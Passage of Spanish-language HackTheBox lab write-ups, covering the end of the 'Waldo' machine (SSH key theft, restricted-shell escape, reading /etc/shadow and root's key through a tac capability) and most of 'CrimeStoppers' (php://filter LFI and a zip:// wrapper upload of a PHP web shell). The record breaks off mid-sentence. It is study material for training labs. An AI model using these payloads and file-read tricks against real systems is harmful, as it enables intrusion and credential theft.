root:x:0:0:root:/root:/bin/ashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9:13:news:/usr/lib/news:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologinoperator:x:11:0:operator:/root:/bin/shman:x:13:15:man:/usr/man:/sbin/nologinpostmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologincron:x:16:16:cron:/var/spool/cron:/sbin/nologinftp:x:21:21::/var/lib/ftp:/sbin/nologinsshd:x:22:22:sshd:/dev/null:/sbin/nologinat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologinsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologinxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologingames:x:35:35:games:/usr/games:/sbin/nologinpostgres:x:70:70::/var/lib/postgresql:/bin/shcyrus:x:85:12::/usr/cyrus:/sbin/nologinvpopmail:x:89:89::/var/vpopmail:/sbin/nologinntp:x:123:123:NTP:/var/empty:/sbin/nologinsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologinguest:x:405:100:guest:/dev/null:/sbin/nologinnobody:x:65534:65534:nobody:/home/nobody:/bin/shnginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologinComo usuarios interesantes tenemos: root, operator y nobody. Jugando con algunos archivos por default no encontramos nada m√°s :( ac√° recaemos en el objeto dirRead. php: file=. /dirRead. php Hacemos de nuevo el formateo y obtenemos: &lt;?phpif($_SERVER['REQUEST_METHOD'] ===  POST ){  if(isset($_POST['path'])){    header('Content-type: application/json');    $_POST['path'] = str_replace( array( . . / ,  . .  ),   , $_POST['path']);    echo json_encode(scandir( /var/www/html/  . $_POST['path']));  }else{    header('Content-type: application/json');    echo '[false]';  }}En este objeto simplemente toma la variable path, vuelve a validar que no tengan . . o . . / y hace un scandir (como un ls) sobre esa ruta: O podemos ver tooodos los objetos que usa la web simplemente borrando el directorio . list de la variable: Ese ser√≠a su uso normal, ¬øpero y si volvemos a tomar nuestro ‚Äúpayload‚Äù con el que vimos archivos del sistema y lo usamos para listar directorios? üëÄ üòÑ ¬øEsa petici√≥n es real o solo cambi√© el valor de la variable path para hacerles creer que funciona? Pues era reaaaaaal, tenemos ahora acceso a listar directorios del sistemaaaaaaaaaaaa (a los que tengamos acceso, claramente ü§≠) Despu√©s de movernos entre rutas encontramos este conjunto de directorios:  Un directorio . ssh, podemos inspeccionarlo a ver si hay llaves de acceso que le permitan a alg√∫n usuario ingresar al sistema sin necesidad de colocar contrase√±as, esto simplemente conect√°ndose con una llave:  Concepto SSH Keys. Un objeto llamado . monitor que si intentamos usarlo como directorio nos devuelve un false, por lo que no es un directorio, peeeeeeeeeeero, tenemos por otro lado el archivo para leer objetos del sistema, us√©moslo para ver su contenido: OPAAAAAAAAAAAAAAAAAA una llave SSH privada, pues pas√©mosla a nuestro sistema, d√©mosle el formato lindo e intentemos usarla contra el sistema v√≠ctima, quiz√°s es funcional para alg√∫n usuario actual. Debemos darle los permisos necesarios, as√≠ evitamos problemas: ‚ù± chmod 600 monitor_idRSAJugando con los usuarios que encontramos antes, si intentamos la conexi√≥n como nobody logramos obtener una sesi√≥n en el sistema: ‚ù± ssh nobody@10. 10. 10. 87 -i monitor_idRSA Perfectisiiiiimo, tamos dentrooooo (: ‚Ä¶ Movimiento lateral (jueguitos con SSH): nobody -&gt; monitor #Estamos en un contenedor y hay poquitas cosas que hacer y sobre todo que enumerar‚Ä¶ Si revisamos los servicios activos tanto locales como en uso vemos el puerto 8888 y el puerto 9000: waldo:~/. ssh$ netstat -lant Active Internet connections (servers and established)Proto Recv-Q Send-Q Local Address      Foreign Address     Statetcp    0   0 0. 0. 0. 0:80       0. 0. 0. 0:*        LISTENtcp    0   0 0. 0. 0. 0:22       0. 0. 0. 0:*        LISTENtcp    0   0 0. 0. 0. 0:8888      0. 0. 0. 0:*        LISTENtcp    0   0 127. 0. 0. 1:9000     0. 0. 0. 0:*        LISTENtcp    0   0 10. 10. 10. 87:8888    10. 10. 14. 6:49726    ESTABLISHED tcp    0   0 :::80          :::*          LISTENtcp    0   0 :::22          :::*          LISTENtcp    0   0 :::8888         :::*          LISTENVemos que nuestra conexi√≥n con la m√°quina se estableci√≥ sobre el puerto 8888, lo cual es extra√±o porque nosotros ingresamos usando SSH por lo que deber√≠a ser el puerto 22 el que tendr√≠a que estar establecido, si nos vamos r√°pidamente a la configuraci√≥n SSH del sistema vemos esto: waldo:~/. ssh$ cat /etc/ssh/sshd_config     . . . Port 8888. . . El puerto 8888 es el que sirve el servicio SSH, ¬øpero y entonces el puerto 22 que vimos arriba? Hay dos servicios SSH lo cual esta muy loco :o Si recordamos nosotros entramos a la m√°quina por medio de una llave SSH de esta ruta: waldo:~/. ssh$ pwd/home/nobody/. sshwaldo:~/. ssh$ ls -latotal 20drwx------  1 nobody  nobody    4096 Jul 15 2018 . drwxr-xr-x  1 nobody  nobody    4096 Jul 24 2018 . . -rw-------  1 nobody  nobody    1675 May 3 2018 . monitor-rw-------  1 nobody  nobody     394 May 3 2018 authorized_keys-rw-r--r--  1 nobody  nobody     344 Aug 6 18:53 known_hostsSi revisamos el archivo authorized_keys notamos algo distinto: waldo:~/. ssh$ cat authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk3B/oKmWZHgkfqfg1xx2bVlT6oHvuWLxk6/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp/zuzQVkGFgCLMas014suEHUhkiOkNUlRtJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbBVeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+arOD6NJOFJY4jBHvf monitor@waldo¬øUn usuario llamado monitor del sistema en el que estamos? Pero si hab√≠amos visto que solo exist√≠an los usuarios root, operator y nobody. Puuuuues como prueba podemos jugar con la llave privada de nobody (que el archivo se llama . monitor u. u) pero ahora contra el usuario monitor, solo que apuntamos al servicio SSH corriendo en el puerto 22 localmente, aaaa ver: waldo:~/. ssh$ ssh monitor@localhost -i . monitor Varias cositas interesantes:  ESTAMOS DEEEEEEEEEEEEEEEEEENTROOOO como monitor.  La m√°quina se pone juguetona con la bienvenida que nos da.  Estamos en alguna Shell restringida, por lo que no podemos hacer muchas cositas :(Bien, bien, mal. No podemos hacer casi nada, ni cd, ni cat, nada de nada. Bypasseamos la Shell restringida üìå: monitor@waldo:~$ cd . . -rbash: cd: restrictedSi revisamos el $PATH (para saber en qu√© rutas busca el sistema los programas que pasamos como comandos) vemos: monitor@waldo:~$ echo $PATH/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0. 1Y si revisamos por ejemplo la primera ruta, tendr√≠amos los binarios que podemos ejecutar: monitor@waldo:~$ ls -la /home/monitor/bintotal 8dr-xr-x--- 2 root monitor 4096 May 3 2018 . drwxr-x--- 5 root monitor 4096 Jul 24 2018 . . lrwxrwxrwx 1 root root    7 May 3 2018 ls -&gt; /bin/lslrwxrwxrwx 1 root root   13 May 3 2018 most -&gt; /usr/bin/mostlrwxrwxrwx 1 root root    7 May 3 2018 red -&gt; /bin/edlrwxrwxrwx 1 root root    9 May 3 2018 rnano -&gt; /bin/nanoSolo 4 comandos‚Ä¶ Ejecutando echo $SHELL sabemos que estamos un una rshell o sea una restricted shell. Buscando en internet maneras de bypassear esto ninguna opci√≥n nos funciona, pero nos da ideas para intentar contra los binarios que tenemos:  T√©cnicas para escapar de shells restringidas (restricted shells bypassing). Despu√©s de un rato encontramos este post que nos habla sobre el comando ed (que restringido seria red) que sirve como editor de texto. Pero ese post nos muestra su funcionamiento, validemos si hay alguna manera de ejecutar comandos con √©l‚Ä¶  ed - Unix, Linux Command. Opaaaa, podemos usar !commando para que sea interpretada con una sh. Pues intentemos simplemente spawnearnos una /bin/bash a ver si logramos salir de la rbash: OJITOOOOOOOOOOOOO podemos movernooooooooos entre directorios, pero claro a√∫n no podemos ejecutar id porque el sistema no encuentra un binario en toooodas las rutas del PATH que este asociado a ese comando, pero eso es sencillo, solo debemos modificar el valor de la variable PATH por las rutas donde linux tiene todooos los binarios:  Si no tienes ni idea de eso dizque el ‚ÄúPATH‚Äù. (Podemos hacer en nuestra m√°quina echo $PATH y copiar las del sistema (las que no tienen nuestro usuario) o buscar en internet las rutas) Perrrrrrfecto, ahora si tenemos acceso a los comandos del sistema, si ga mos‚Ä¶ üèá Despu√©s de que algunos binarios no los encontraba, finalmente nuestro PATH queda as√≠: monitor@waldo:~$ echo $PATH/sbin:/usr/sbin:/bin:/usr/bin:/usr/local/bin:/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0. 1‚Ä¶ Escalada de privilegios #Enumerando las capabilities del sistema (que serian como peque√±as instrucciones privilegiadas otorgadas a X proceso(s)) encontramos: monitor@waldo:~$ getcap -r / 2&gt;/dev/null/usr/bin/tac = cap_dac_read_search+ei/home/monitor/app-dev/v0. 1/logMonitor-0. 1 = cap_dac_read_search+eiActualmente contamos con dos archivos usando la capability CAP_DAC_READ_SEARCH, la cual permite bypassear los permisos de lectura que existan en los archivos üòÆ kooooooooomoooo? üòà M√°s info sobre capabilities:  Understanding Linux Capabilities Series (Part I).  Linux Capabilities: Why They Exist and How They Work. Uno de los dos se relaciona con el usuario monitor, pero inicialmente me llamo la atenci√≥n la de tac, buscando que hace ese comando en Linux, es pr√°cticamente un `ca, pero que imprime el resultado al rev√©s, b√°sicamente: monitor@waldo:/tmp$ cat hola. txt holasinopmonitor@waldo:/tmp$ tac hola. txt nopsiholaPero recordemos que el binario tac tiene la capability que le permite saltarse los permisos de lectura de cualquier archivo, por lo que podemos hacer una prueba sencilla con el archivo /etc/shadow, a √©l simplemente tiene acceso root (o alg√∫n usuario privilegiado), por lo que si intent√°ramos abrirlo con cat deber√≠amos obtener un permission denied: monitor@waldo:/tmp$ cat /etc/shadowcat: /etc/shadow: Permission deniedEfectivamente, no tenemos permisos para ver su contenido‚Ä¶ ¬øPeeeeroooo y con tac? monitor@waldo:/tmp$ tac /etc/shadow VAMOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO podemos leer archivos privilegiaaaados del sistemaaaaaaaaaaaaaaaa.  Lo √∫nico es que se nos imprime al rev√©s, pero con la misma herramienta podemos usar el par√°metro -s , (separado por ,) y el programa nos lo muestra en el orden normal (pero claro, nos aprovechamos de un feature, en todo caso si existiera alg√∫n problema podemos tomar el contenido, guardarlo en un archivo y volver a ejecutar tac, en ese caso lo mostrar√≠a ahora si con el orden correcto) monitor@waldo:/tmp$ cat hola. txt holasinopmonitor@waldo:/tmp$ tac hola. txt -s ,holasinopBien, pues si podemos leer el archivo shadow podemos buscar si existe alguna llave privada para el usuario root: monitor@waldo:/tmp$ tac /root/. ssh/id_rsa -s , (EL TOOOOOOOOOOOOC de eso vac√≠o e. e) OPAAAAAAAAAAAAAAAAAA, exiiiiiste, pues copi√©mosla, generemos un archivo con ella e intentemos conectarnos como el usuario root al servicio SSH. Despu√©s de varios intentos no logramos obtener una Shell, averiguando con mis contactos clandestinos (s4dbrd üíñ) parece ser algo con lo que el creador quiso jugar (:( E indagando en el sistema encontramos la raz√≥n: monitor@waldo:/tmp$ cat /etc/ssh/sshd_config. . . PermitRootLogin no. . . Podr√≠amos jugar con cracking contra el archivo shadow, pero de lo que prob√© se demor√≥ demasiado, as√≠ que F. Veamos las flags:  ‚Ä¶ Bonita m√°quina, medio loca, me gusto el LFI, bastante interesante. El privesc fue movidito, el tema de SSH fue bastante curioso y entretenido. El jugar con esa capability algo bastante peligroso. Por hoy no es m√°s, descansamos un poco los ojos, miramos izquierda y derecha, estiramos las manos yyyyyy a seguir aprendiendo! ¬°A romper todooooooooooOOO!! "
    }, {
    "id": 28,
    "url": "http://localhost:4000/htb/crimestoppers",
    "title": "HackTheBox - CrimeStoppers",
    "body": "2021/08/08 - M√°quina Linux nivel dif√≠cil. Explotaci√≥n web con filtros (wrappers) consiguiendo LFI y RCE, contrase√±as de Thunderbird, correos llenos de odio, persistencias locas (un rootkit) y jugueteo entre reversing y criptograf√≠a.  TL;DR (Spanish writeup): Creada por: IppSec (diosito). Virgencita lo que nos espera, los malos han ganado üòî Encontraremos un servidor web para enviar informaci√≥n sobre unos ciberatacantes, jugando con la web se nos avisar√° que existe un par√°metro vulnerable a LFI (Local File Inclusion) y a RCE (Remote Command Execution), lo encontraremos, jugaremos con wrappers para leer los objetos de la web. Despu√©s de algo de enumeraci√≥n entenderemos varios temas relacionados con la web y los reportes subidos. Para conseguir RCE tendremos que jugar de nuevo con un wrapper, esta vez el que esta relacionado con zip://, ¬øpero para qu√©? bien, aprovecharemos la subida de los reportes para adjuntar en un campo de la trama el contenido (un . php con maldad dentro) de un archivo . zip para con ayuda del wrapper referenciarlo y leer el objeto . php que tiene dentro, ese archivo . php ser√° el culpable de poder ejecutar comandos en el sistema como el usuario www-data. ü™ï Script que automatiza la subida y genera RCE, rceZIPwrapper. py Estando dentro jugaremos con el servicio Thunderbird para dumpear las contrase√±as que guarda Mozilla en el sistema, esto para obtener credenciales v√°lidas contra un usuario llamado dom. Ya siendo dom vamos a encontrarnos de nuevo cositas de mails, en este caso vamos a leer unos correos algo tenebrosos, en uno de ellos se hace referencia a que dom encontr√≥ un rootkit en el sistema pero no esta seguro si esta en funcionamiento o no. Tendremos que colocarnos en la posici√≥n del atacante, encontrar ese rootkit y sobre todo usarlo para conseguir una Shell como el usuario root. Peroooo, no ser√° tan sencillo. Vamos a jugar un poquito con reversing y con criptografia para encontrar que los atacantes cambiaron la manera por default de usar el rootkit y agregaron su propia funci√≥n que juega con keys y XORs. Finalmente obtendremos la cadena con la que esta comparando la key y haremos funcionar correctamente el rootkit, ¬øo sea? Obtendremos una sesi√≥n en el sistema como el usuario root. ‚Ä¶ Clasificaci√≥n de la m√°quina: Enumeraci√≥n por montones, vulns conocidas y mucho m√°s real de lo que creemos üëª  Escribo para tener mis ‚Äúnotas‚Äù, por si alg√∫n d√≠a se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y √©xitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice. ‚Ä¶ Es momento de cantar üé∂  Reconocimiento.      Enumeraci√≥n de puertos con nmap.     Enumeraci√≥n.      Enumeramos servidor web en el puerto 80.     Explotaci√≥n, encontramos LFI.      Exploramos los archivos fuente de la web. .    Vamos de LFI a RCE usando el wrapper zip://.     Movimiento lateral - Thunderbird.      Dumpeamos credenciales de Thunderbird con dos herramientas.     Escalada de privilegios, jugamos con un rootkit.      Encontramos rootkit en el sistema.    Hacemos reversing hacia el rootkit, jugamos con XOR y desciframos como usar el backdoor.     Post explotaci√≥n, logramos acceso SSH por IPv6. ‚Ä¶ Reconocimiento #‚Ä¶ Enumeraci√≥n de puertos con nmap üìå: Como siempre, vamos a empezar descubriendo los puertos abiertos de la m√°quina, juguemos con nmap para eso: ‚ù± nmap -p- --open -v 10. 10. 10. 80 -oG initScanPero el escaneo va moooooy lento, as√≠ que agregaremos el par√°metro --min-rate: ‚ù± nmap -p- --open -v --min-rate=2000 10. 10. 10. 80 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       ‚Äìmin-rate=N   Le decimos que en cada petici√≥n que haga no env√≠e menos paquetes de N       -oG   Guarda el output en un archivo con formato grepeable para usar la funci√≥n extractPorts de S4vitar que extrae los puertos en la clipboard   Este escaneo nos devuelve un solo puerto abierto (es importante validar de nuevo, ya que al ser un escaneo ‚Äúforzado‚Äù pueda que nmap sobrepase algunos puertos): ‚ù± cat initScan# Nmap 7. 80 scan initiated Sat Jul 31 25:25:25 2021 as: nmap -p- --open -v --min-rate=2000 -oG initScan 10. 10. 10. 80# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 80 ()	Status: UpHost: 10. 10. 10. 80 ()	Ports: 80/open/tcp//http///	Ignored State: filtered (65534)# Nmap done at Sat Jul 31 25:25:25 2021 -- 1 IP address (1 host up) scanned in 73. 69 secondsTenemos:       Puerto   Descripci√≥n         80   HTTP: Nos brinda un servidor web   Al ser un solo puerto, no es necesario el uso de la funci√≥n extractPorts (pero si no sabes el uso, en el 90% de writeups esta). Ahora vamos a ver que versi√≥n y scripts tiene relacionado ese servicio web: ‚ù± nmap -p 80 -sC -sV 10. 10. 10. 80 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   Y este escaneo nos devuelve: ‚ù± cat portScan# Nmap 7. 80 scan initiated Sat Jul 31 25:25:25 2021 as: nmap -p 80 -sC -sV -oN portScan 10. 10. 10. 80Nmap scan report for 10. 10. 10. 80Host is up (0. 11s latency). PORT  STATE SERVICE VERSION80/tcp open http  Apache httpd 2. 4. 25 ((Ubuntu))|_http-server-header: Apache/2. 4. 25 (Ubuntu)|_http-title: FBIs Most Wanted: FSocietyService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Sat Jul 31 25:25:25 2021 -- 1 IP address (1 host up) scanned in 15. 98 secondsBien, ¬øqu√© vemos?:       Puerto   Servicio   Versi√≥n         80   HTTP   Apache/2. 4. 25   Y algo sobre el FBI üò®. Sabemos que si o si debemos explotar algo web, as√≠ que profundicemos y d√©mosle a estoooooooooooooooooo. ‚Ä¶ Enumeraci√≥n #‚Ä¶ Puerto 80 üìå: Varias cositas encontramos en la web inicial:  Dos apartados arriba a la izquierda, el home y uno llamado upload.  Nos muestra algunos ataques realizados por fsociety, podemos tenerlos en cuenta por si algo.  Tenemos algunos nombres, quiz√°s usuarios, no lo sabemos, guard√©moslos. Si visitamos el apartado upload vemos una URL medio interesante y un formulario para enviar informaci√≥n relacionada con alg√∫n miembro de fsociety: La URL con su formato ?op= nos pone a pensar sobre algunas inyecciones, pero probando algunas b√°sicas no vemos nada, sigamos. Si llenamos los dos campos con info random:  Information: hola Name: elliotEnviamos la data y nos redirige a esta p√°gina: Jmmm, el valor elliot no lo vemos por ning√∫n lado y solo nos devuelve la informaci√≥n que agregamos‚Ä¶ La URL va al recurso view y se genera otra variable llamada secretname con un hash tipo SHA1 que no importa lo que pongamos en los campos del formulario, siempre va a ser distinto (seg√∫n las pruebas que he hecho hasta ahora e. e). Revisando el c√≥digo fuente del recurso upload vemos un comentario bastante llamativo: :o Una referencia a una vulnerabilidad tipo SQL injection en algo llamado Tip, curiosamente debajo vemos un campo de texto con id tip, jmmm, interesant√≠simo. Parece que ha sido removido ese campo en el viaje a la base de datos y se crea un archivo con √©l (no me quedo claro), pero igual podemos probar despu√©s. Sigamos con BurpSuite as√≠ interceptamos las peticiones y vemos como viajan la data: BurpSuite, interceptamos peticiones y üëÄ cositas üìå: Inicialmente jugaremos con el home, probemos tu vista, ¬øves algo interesante?: ¬øLo viste? En nuestro header Cookie existe una llamada admin y tiene el valor 0, como indicando que no somos admin, pues podemos jugar ya sea con el propio BurpSuite, un editor de cookies o con el propio navegador web para cambiar esa cookie al valor 1, quiz√°s nos convierta en admin o quiz√°s no, probemos: Usar√© la extensi√≥n CookieManager en Firefox para cambiar ese valor, actualizamos la p√°gina web yyyyyyyyyyyyy junto a home y upload vemos un nuevo recurso: Opaa, el apartado list, pues ve√°moslo: Tenemos tooodos los archivos que se han creado, ya que si damos clic en cualquiera vemos nuestros  hola  y las distintas pruebas que hicimos antes, pero claro, hay un objeto distinto a los dem√°s: whiterose. txt, veamos su contenido: Encontramos un rega√±o de alguien contra los desarrolladores, les indica que uno de los par√°metros enviados por el m√©todo GET (los que vemos en la URL) contiene una vulnerabilidad que inicialmente le deja ver el c√≥digo fuente de algunos objetos, pero hay una prueba que le permiti√≥ ejecutar comandos remotamente üòØ Tambi√©n vemos un email del cual si extraemos el dominio DarkArmy. htb, podr√≠amos probar el agregarlo al archivo /etc/hosts y ver si la resoluci√≥n entre 10. 10. 10. 80 DarkArmy. htb nos devuelve algo distinto a la web que ya enumeramos desde el inicio (que no tendr√≠a mucho sentido, ya que es un usuario X con un email X, pero pues podemos probar).  Pero no, no cambia, as√≠ que sigamos con lo encontrado antes‚Ä¶ ‚Ä¶ Es un mensaje para el equipo de desarrollo, pero tambi√©n es para nosotros, nos dice que existe un campo GET vulnerable, tambi√©n que ese campo le permite ver en c√≥digo fuente de los archivos (puede ser el par√°metro secretname ya que es el indicador de cu√°l archivo queremos ver en la web), as√≠ que primero enfoqu√©monos en encontrar un campo que al ser vulnerado lea los fuentes del sistema (LFI) y ya despu√©s nos volcamos al RCE üöÄ. ‚Ä¶ Explotaci√≥n, encontramos el par√°metro vulnerable #ü§Ø Una vulnerabilidad tipo LFI (Local File Inclusion) nos permite b√°sicamente leer archivos a los cuales no deber√≠amos tener acceso (que est√°n fuera de los objetos que usa la web), por ejemplo los del sistema. Despu√©s de muchas pruebas que me ten√≠an como un üßü encontramos algo. üòä Intentando enumerar ya sea el archivo /etc/passwd o alguno de los objetos que se referencian en la web (como list o list. php) usando el par√°metro secretname, nada, no conseguimos respuesta alguna. Movi√©ndonos entre par√°metros solo nos quedar√≠a uno, op, pues intentemos ahora el LFI ah√≠: Pero nada, vemos Error‚Ä¶ Pero podemos probar m√°s cosas, como por ejemplo intentar movernos de carpetas del sistema e ir buscando el archivo /etc/passwd (o lo dicho antes, los objetos de la web), esto es sencillo, simplemente vamos sali√©ndonos de los directorios usando . . /, por lo que cada repetici√≥n de esa cadena es un directorio atr√°s. Vay√°monos bieeeeeen a la ra√≠z del sistema y busquemos . . /. . /. . /. . /. . /etc/passwd: Jmmmm, es un mensaje juguet√≥n, probando cosas vemos que el mensaje sale cuando se env√≠an dos puntos en la cadena. Siguiendo este post vemos algunas pruebas contra los LFI, probando y probando llegamos a la secci√≥n de wrappers, que serian como c√≥digos adicionales que le indican a la web como queremos que se maneje la petici√≥n. M√°s info de wrappers. En la secci√≥n de wrappers existe uno que me gusta mucho: php://filter/convert. base64-encode/resource=index. phpLo que hace es tomar el contenido del archivo index. php y codificarlo a base64, esto para mostrar por pantalla toooda la cadena encodeada. Es muy usado en este tipo de ataques, ya que muchas veces al intentar leer el contenido de un archivo . php sin un wrapper el contenido ser√° interpretado m√°s no mostrado. Ah√≠ es cuando nos salvan los wrappers. Intentando cositas como: http://10. 10. 10. 80/?op=php://filter/convert. base64-encode/resource=/etc/passwd// O encodeando los puntos:http://10. 10. 10. 80/?op=php://filter/convert. base64-encode/resource=%252e%252e%252fetc%252fpasswdNo logramos la explotaci√≥n üò• peeeeeeeeeeeeeeeeeeeero, si en vez de archivos del sistema intentamos jugar con los objetos usados por la web nos cambia la cara: üòÆ F: http://10. 10. 10. 80/?op=php://filter/convert. base64-encode/resource=list. phpTamo: http://10. 10. 10. 80/?op=php://filter/convert. base64-encode/resource=list Vemos una cadena en base64 gigante, tom√©mosla y decodifiqu√©mosla: Listones, podemos hacer esto mismo con los dem√°s recursos o crearnos un script que simplemente tome el archivo que queremos ver y en su l√≥gica lo decodee y nos lo muestre, ah√≠ les dejo la tarea (: Exploramos los c√≥digos fuente usados por la web üìå: Encontramos el mensaje al intentar . . y al jugar con null bytes (%00), adem√°s el include que es el que implementa el valor de $op (le agrega el . php) en la web: &lt;?php. . . $op = empty($_GET['op']) ? 'home' : $_GET['op'];if(!is_string($op) || preg_match('/\. \. /', $op) || preg_match('/\0/', $op))  die('Are you really trying ' . htmlentities($op) . '!? Did we Time Travel? This isn\'t the 90\'s');. . . . . . . . . if(!(include $op . '. php'))  fatal('no such page');?&gt; Por eso si intentabamos buscar upload. php terminar√≠a la funci√≥n incluyendo upload. php. php, y claramente ese objeto no existe.  Diferencia entre file_get_contents() e include(). Sigamos‚Ä¶ Nos encontramos el objeto que hace la subida de los archivos, upload. php: &lt;?phpinclude 'common. php';// Stop the automated tools from filling up our ticket system. session_start();if (empty($_SESSION['token'])) {  $_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));}$token = $_SESSION['token'];$client_ip = $_SERVER['REMOTE_ADDR']; // If this is a submission, write $tip to file. if(isset($_POST['submit']) &amp;&amp; isset($_POST['tip'])) {  // CSRF Token to help ensure this user came from our submission form.   if (!empty($_POST['token'])) {    if (hash_equals($token, $_POST['token'])) {      $_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));      // Place tips in the folder of the client IP Address.       if (!is_dir('uploads/' . $client_ip)) {        mkdir('uploads/' . $client_ip, 0755, false);      }      $tip = $_POST['tip'];      $secretname = genFilename();      file_put_contents( uploads/ . $client_ip . '/' . $secretname, $tip);      header( Location: ?op=view&amp;secretname=$secretname );    }     else {      print 'Hacker Detected. ';      print $token;      die();    }  }} else {?&gt;. . . Vemos que extrae nuestra IP y con ella genera un directorio para guardar los archivos, algo as√≠: uploads/10. 10. 14. 5. Tambi√©n notamos algo interesante (lo que nos indicaba en el comentario del HTML que vimos hace un rato), el contenido del archivo que vamos a crear el enviado por la variable $_POST['tip'];. As√≠ que ya sabr√≠amos donde sube los objetos y como controlar su contenido, pero el nombre es un poco distinto, lo genera con la funci√≥n genFilename() del objeto common. php y es guardado en la variable $secretname. Veamos common. php: &lt;?php/* Stop hackers. */if(!defined('FROM_INDEX')) die();// If the hacker cannot control the filename, it's totally safe to let them write files. . . Or is it?function genFilename() {  return sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT'] . time() . mt_rand());}?&gt;Bien, es una concatenaci√≥n de cadenas, nuestra IP, el contenido del User-Agent, el tiempo en que la petici√≥n fue enviada y un numero random. Tooodo eso forma una cadena que ser√° convertida en un hash SHA1, ese hash ser√° el nombre de nuestro archivo, esta hecho as√≠ para que no podamos cambiar el nombre del objeto (como bien dice el comentario). Pero no estamos del todo perdidos, tenemos la posibilidad de escribir lo que queramos en ese archivo, nos queda mirar QU√â escribir para lograr la explotaci√≥n. ‚Ä¶ Con nuestras pruebas anteriores vimos un wrapper con una descripci√≥n interesante:  Tomada de: hacktricks. xyz - Wrapper zip://. Nos indica que podemos intentar subir un archivo . zip (simplemente le cambia la extensi√≥n a . jpg, podemos probar de las dos maneras) con contenido dentro, por ejemplo un . php para despu√©s desde el par√°metro vulnerable jugar con el wrapper zip:// e intentar leer el archivo comprimido y con %23 (# en URLencode) hacer referencia a alg√∫n objeto que este dentro de ese comprimido, as√≠, conseguir√≠amos por ejemplo hacer que un objeto . php sea interpretado, pues intentemos:  Local File Inclusion (LFI) ‚Äì Cheat Sheet.  Leveraging LFI to RCE using zip://. ‚Ä¶ De LFI a RCE con wrapper zip:// üìå: Entonces, debemos hacer esto:  Generar un archivo . php con el contenido que queramos.  Comprimir ese archivo . php en un archivo . zip.  Usar el campo tip (si recordamos ese campo contiene la data que se guardara en el contenido del archivo) para enviar el contenido del **. zip.  Jugar con el wrapper zip:// para leer el objeto . zip y despu√©s referenciar al archivo . php con el s√≠mbolo # (URLencodeado seria %23).      Volviendo a revisar el c√≥digo sabemos que los archivos subidos se est√°n guardando con en esta ruta: uploads/nuestra_ip/nombre_SHA1_archivo. Esto es importante para que nuestro wrapper pueda encontrar el objeto comprimido, ya lo veremos en pr√°ctica.    Pues listos, empecemos‚Ä¶ 1. Generamos archivo . php. Un simple archivo que tome una variable (llamada xmd) enviada por el m√©todo GET y que su contenido sea ejecutado en el sistema usando la funci√≥n system(): ‚ù± cat hola. php &lt;?php system($_GET['xmd']); ?&gt;2. Comprimimos el objeto . php y generamos un . zip. Simplemente ejecutamos: ‚ù± zip acata. zip hola. php  adding: hola. php (stored 0%)(Podemos tomar el . zip y renombrarlo a . jpg, pero yo lo copiar√© para en caso de que el . zip no nos funcione probar con el . jpg) Se genera el archivo acata. zip y en su contenido esta el archivo hola. php. 3. Subimos el contenido del . zip a la web. Usaremos BurpSuite para esto, ya que estaremos jugando con bytes, saltos de l√≠nea y s√≠mbolos extra√±os, as√≠ evitaremos que un simple espacio (por ejemplo al copiar y pegar en el campo de la web) nos da√±e el archivo. Entonces, abrimos Burp, vamos al recurso upload, activamos el proxy, interceptamos con Burp yyyyyyyyy borramos el contenido que tenga el campo tip, lo dejamos vac√≠o. Ahora para pegar el contenido del archivo . zip podemos hacerlo de varias maneras, jugaremos con una de ellas:    Ejecutar cat acata. zip | base64 -w 0, tomar la cadena en base64 y pegarla en el campo tip.      Lo siguiente ser√° volver a seleccionar esa cadena pero ahora en Burp, dar clic derecho y seguir esta ruta:      Convert Selection &gt; Base64 &gt; Base64-decode.    De la forma corta: CTRL+SHIFT+B.     Y deber√≠amos ver algo as√≠:     Damos clic en forward, nos deber√≠a llevar al recurso view y ver√≠amos el hash del archivo que generamos, lo copiamos y damos de nuevo a forward. Ya deber√≠a estar nuestro archivo subido‚Ä¶    Algo que descubr√≠ es que desde la web tenemos acceso a uploads/nuestra_ip/nombre_SHA1_archivo y se nos descarga ese archivo, o si queremos ver tooodos los objetos subidos simplemente quitamos el hash: Bien, podemos descargar el objeto y ver si esta siendo subido con el formato de 